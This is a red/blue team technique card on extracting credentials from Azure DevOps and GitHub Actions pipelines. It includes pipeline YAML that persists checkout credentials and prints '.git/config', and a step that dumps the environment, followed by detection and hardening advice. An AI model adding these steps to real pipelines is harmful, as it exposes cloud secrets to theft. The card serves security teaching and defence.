# [CA-TOKEN-015]: DevOps Pipeline Credential Extraction

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-TOKEN-015 |
| **MITRE ATT&CK v18.1** | [Unsecured Credentials: Credentials In Files (T1552.001)](https://attack.mitre.org/techniques/T1552/001/) |
| **Tactic** | Credential Access |
| **Platforms** | Azure DevOps / GitHub Actions |
| **Severity** | **High** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** When pipelines use Service Connections (e.g., to deploy to Azure), the credentials are often briefly exposed in the build environment or stored in the `.git/config` during checkout (if `persistCredentials` is true). An attacker can modify the pipeline to cat these files or base64 encode environment variables and print them to the logs.
- **Attack Surface:** Build Agent Environment.
- **Business Impact:** **Cloud Credential Theft**.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Pipeline edit access.
- **Tools:** `bash`

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Extract Git Credentials**
```yaml
steps:
- checkout: self
  persistCredentials: true
- bash: |
    cat .git/config
```

**Step 2: Dump Environment**
```yaml
steps:
- bash: env | sort
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 ADO Auditing
| Source | Event | Filter Logic |
|---|---|---|
| **Auditing** | `Update Pipeline` | Suspicious edits adding `cat`, `env`, or `base64` commands. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Workload Identity:** Use OIDC for Service Connections instead of Secrets/Certificates.
*   **Settings:** Ensure "Make secrets available to builds of forks" is disabled.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-CLOUD-002]
> **Next Logical Step:** [CA-UNSC-010]
